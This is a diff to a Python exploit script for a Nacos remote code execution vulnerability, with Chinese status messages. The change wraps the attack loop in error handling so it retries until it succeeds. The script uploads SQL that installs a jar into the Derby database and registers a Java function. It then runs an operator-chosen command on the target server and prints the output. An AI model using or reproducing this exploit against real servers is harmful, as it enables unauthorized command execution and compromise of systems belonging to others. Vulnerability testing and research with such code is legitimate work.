@@ -21,31 +21,34 @@ def exploit(target, command, service, args):
     derby_url = urljoin(target, '/nacos/v1/cs/ops/derby')
     print("正在进行碰撞,请耐心等待!!")
     for i in range(0, sys.maxsize):
-        id = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 8))
-        post_sql = """CALL sqlj.install_jar('{service}', 'NACOS.{id}', 0)\n
-        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS.{id}')\n
-        CREATE FUNCTION S_EXAMPLE_{id}( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'\n""".format(
-            id=id, service=service);
-        option_sql = "UPDATE ROLES SET ROLE='1' WHERE ROLE='1' AND ROLE=S_EXAMPLE_{id}('{cmd}')\n".format(id=id,
-                                                                                                          cmd=command);
-        get_sql = "select * from (select count(*) as b, S_EXAMPLE_{id}('{cmd}') as a from config_info) tmp /*ROWS FETCH NEXT*/".format(
-            id=id, cmd=command);
-        # get_sql = "select * from users /*ROWS FETCH NEXT*/".format(id=id,cmd=command);
-        files = {'file': post_sql}
-        post_resp = requests.post(url=removal_url, files=files, verify=False, headers=header, timeout=5)
-        post_json = post_resp.json()
-        if args.url:
-            print(post_json)
-        if post_json.get('message', None) is None and post_json.get('data', None) is not None:
-            print(post_resp.text)
-            get_resp = requests.get(url=derby_url, params={'sql': get_sql}, verify=False, headers=header,
-                                    timeout=5)
-            print(Fore.RED + f"\n[+] {target} 存在Nacos_Rce漏洞，执行命令：{command}" + Fore.RESET)
-            print(Fore.RED + f"[+] 返回的结果如下: {get_resp.text}" + Fore.RESET)
-            break
-        if (post_json['code'] == 404 or post_json['code'] == 403) or "File" not in post_json['message']:
-            print(Fore.YELLOW + f"[-] {target} 可能不存在Nacos_Rce漏洞\n" + Fore.RESET)
-            break
+        try:
+            id = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 8))
+            post_sql = """CALL sqlj.install_jar('{service}', 'NACOS.{id}', 0)\n
+            CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS.{id}')\n
+            CREATE FUNCTION S_EXAMPLE_{id}( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'\n""".format(
+                id=id, service=service);
+            option_sql = "UPDATE ROLES SET ROLE='1' WHERE ROLE='1' AND ROLE=S_EXAMPLE_{id}('{cmd}')\n".format(id=id,
+                                                                                                              cmd=command);
+            get_sql = "select * from (select count(*) as b, S_EXAMPLE_{id}('{cmd}') as a from config_info) tmp /*ROWS FETCH NEXT*/".format(
+                id=id, cmd=command);
+            # get_sql = "select * from users /*ROWS FETCH NEXT*/".format(id=id,cmd=command);
+            files = {'file': post_sql}
+            post_resp = requests.post(url=removal_url, files=files, verify=False, headers=header, timeout=5)
+            post_json = post_resp.json()
+            if args.url:
+                print(post_json)
+            if post_json.get('message', None) is None and post_json.get('data', None) is not None:
+                print(post_resp.text)
+                get_resp = requests.get(url=derby_url, params={'sql': get_sql}, verify=False, headers=header,
+                                        timeout=5)
+                print(Fore.RED + f"\n[+] {target} 存在Nacos_Rce漏洞，执行命令：{command}" + Fore.RESET)
+                print(Fore.RED + f"[+] 返回的结果如下: {get_resp.text}" + Fore.RESET)
+                break
+            if (post_json['code'] == 404 or post_json['code'] == 403) or "File" not in post_json['message']:
+                print(Fore.YELLOW + f"[-] {target} 可能不存在Nacos_Rce漏洞\n" + Fore.RESET)
+                break
+        except Exception as e:
+                continue
 
 
 if __name__ == '__main__':
